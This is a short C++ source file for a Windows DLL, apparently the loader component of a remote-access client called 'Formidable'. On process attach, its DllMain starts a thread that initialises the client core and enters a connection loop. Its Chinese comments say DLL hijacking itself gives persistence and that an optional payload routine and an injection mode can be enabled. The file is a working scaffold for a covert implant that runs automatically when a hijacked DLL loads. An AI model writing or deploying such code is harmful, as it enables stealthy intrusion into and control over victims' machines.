#include "../Common/ClientCore.h"
#include <windows.h>
#include <thread>
#include <atomic>

using namespace Formidable;

// DLL 版本的客户端入口线程
void ClientThread() {
    InitClientCore();

    // 在 DLL 模式下，通常不需要 InstallClient()，因为 DLL 劫持本身就是一种持久化。
    // 如果需要，可以取消注释：
    // InstallClient();
    
    // 同样，ProcessPayload() 也可以选择性开启
    // ProcessPayload();

    std::atomic<bool> bShouldExit(false);
    std::atomic<bool> bConnected(false);
    
    // 进入主循环
    RunClientLoop(bShouldExit, bConnected);

    CleanupClientCore();
    
    // 如果是注入模式，退出时可能需要释放自身，但作为服务DLL通常不需要
    // FreeLibraryAndExitThread((HMODULE)GetModuleHandle(NULL), 0);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        // 创建线程启动核心逻辑
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ClientThread, NULL, 0, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
